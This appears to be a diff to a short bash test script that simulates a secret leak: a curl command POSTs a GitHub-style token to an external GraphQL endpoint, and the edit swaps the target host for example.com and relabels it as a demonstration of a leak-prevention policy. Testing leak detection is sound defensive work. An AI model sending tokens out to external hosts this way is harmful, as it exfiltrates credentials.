@@ -1,7 +1,8 @@
 #!/bin/bash
 
-# Sending a POST request with a GitHub token (LEAK)
-curl -X POST https://api.veribom.com/graphql \
+# This script simulates a secret leak by sending a POST request to external API. This demonstrates the IR BAF Secret Leak prevention policy.
+
+curl -X POST https://api.example.com/graphql \
   -H "Content-Type: application/json" \
   -d '{
     "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
